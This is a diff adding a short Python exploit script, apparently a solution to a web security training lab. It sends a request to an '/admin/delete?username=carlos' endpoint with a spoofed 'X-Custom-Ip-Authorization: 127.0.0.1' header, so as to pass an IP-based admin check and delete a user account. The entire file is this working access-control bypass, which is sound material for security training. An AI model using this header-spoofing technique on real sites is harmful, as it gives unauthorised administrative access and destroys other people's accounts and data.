@@ -1,0 +1,15 @@
+import requests
+
+url = "YOUR_URL"
+payload="/admin/delete?username=carlos"
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "X-Custom-Ip-Authorization": "127.0.0.1"
+}
+
+response = requests.get(url+payload, headers=headers)
+print(response.status_code)
+print(response.text)
